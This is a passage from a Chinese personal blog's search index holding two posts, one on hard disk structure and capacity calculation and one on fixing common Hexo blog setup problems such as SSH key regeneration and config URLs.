          <category> 进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件修复 </tag>
            
            <tag> winhex </tag>
            
            <tag> 进制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>硬盘基本知识</title>
      <link href="/%E7%A1%AC%E7%9B%98%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/%E7%A1%AC%E7%9B%98%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="硬盘基本知识"><a href="#硬盘基本知识" class="headerlink" title="硬盘基本知识"></a>硬盘基本知识</h1><h2 id="硬盘由５部分组成："><a href="#硬盘由５部分组成：" class="headerlink" title="硬盘由５部分组成："></a>硬盘由５部分组成：</h2><ol><li>盘片，磁头，磁道，扇区，柱面</li><li>盘片 片面 和 磁头<br>硬盘中一般会有多个盘片组成，每个盘片包含两个面，每个盘面都对应地有一个读/写磁头。受到硬盘整体体积和生产成本的限制，盘片数量都受到限制，一般都在5片以内。盘片的编号自下向上从0开始，如最下边的盘片有0面和1面，再上一个盘片就编号为2面和3面。<br><img src="https://upload-images.jianshu.io/upload_images/2843224-46fb935cd31addbd.png"><br>扇区 和 磁道<br>下图显示的是一个盘面，盘面中一圈圈灰色同心圆为一条条磁道，从圆心向外画直线，可以将磁道划分为若干个弧段，每个磁道上一个弧段被称之为一个扇区（图践绿色部分）。扇区是磁盘的最小组成单元，通常是512字节。（由于不断提高磁盘的大小，部分厂商设定每个扇区的大小是4096字节）<br><img src="https://upload-images.jianshu.io/upload_images/2843224-56f2056f0b36009f.png"><br>编号是：从下到上依次递增，最下面是０<pre><code> 从外到内依次递增，最外面是０</code></pre><h2 id="磁盘容量计算"><a href="#磁盘容量计算" class="headerlink" title="磁盘容量计算"></a>磁盘容量计算</h2></li><li>存储容量 ＝ 磁头数 × 磁道(柱面)数 × 每道扇区数 × 每扇区字节数<br>磁头数：硬盘总共有几个磁头，也就是有几面盘片，最大为２５５；２５６－１<br>柱面数：每一面磁片上有几条磁道，最大为１０２３；１０２４－１<br>扇区数：每一条磁道上有几个扇区，最大为６３，每一个扇区的角度就是３６０/扇区数；６４－１<br>综上，欸，我们可以求最大容量了：<br>255 * 1023 * 63 * 512 / 1048576 = 8024 GB ( 1M =1048576 Bytes )<h2 id="硬盘坏道"><a href="#硬盘坏道" class="headerlink" title="硬盘坏道"></a>硬盘坏道</h2></li><li>硬盘中的部分数据无法使用或者使用出现了异常。更标准的说法为坏扇区而不是坏扇道，因为磁盘的最小寻址单位是扇区而不是磁道</li></ol><h1 id="数据的存储原理"><a href="#数据的存储原理" class="headerlink" title="数据的存储原理"></a>数据的存储原理</h1><ol><li>信息存储在硬盘中，硬盘是由很多的盘片构成的，通过盘片表面的磁性物质来存储数据</li><li>凸起的地方被磁化，代表数字1，凹的地方没有被磁化，代表数字0，因此硬盘可以以二进制的形式来存储文字，图片等信息</li></ol>]]></content>
      
      
      <categories>
          
          <category> 文件修复 </category>
          
          <category> 定于 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件修复 </tag>
            
            <tag> 定义 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建博客过程中常见的问题</title>
      <link href="/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"/>
      <url>/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="博客搭建过程中常见问题"><a href="#博客搭建过程中常见问题" class="headerlink" title="博客搭建过程中常见问题"></a>博客搭建过程中常见问题</h1><h2 id="spawn-error"><a href="#spawn-error" class="headerlink" title="spawn error"></a>spawn error</h2><ol><li>需要改config文件下的repo<h2 id="改写ssh密钥"><a href="#改写ssh密钥" class="headerlink" title="改写ssh密钥"></a>改写ssh密钥</h2></li><li>删掉C盘用户中的.ssh文件</li><li>ssh-keygen -t rsa -C <a href="mailto:&#120;&#x78;&#x78;&#x78;&#x40;&#x71;&#113;&#46;&#99;&#111;&#109;">&#120;&#x78;&#x78;&#x78;&#x40;&#x71;&#113;&#46;&#99;&#111;&#109;</a> 一定要加上邮箱！！！</li><li>再次打开.ssh文件（用啥都行，有一次直接IE都能打开）</li><li> <img src="https://s4.ax1x.com/2021/12/05/oDfnE9.png"><h2 id="主题无法上传但是本地可以"><a href="#主题无法上传但是本地可以" class="headerlink" title="主题无法上传但是本地可以"></a>主题无法上传但是本地可以</h2></li><li>一定一定一定要修改blog文件中的_config.yml文件中的URL，将其替换为自己博客的地址！！！！！！</li><li><img src="https://s4.ax1x.com/2021/12/05/oDhdZ4.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
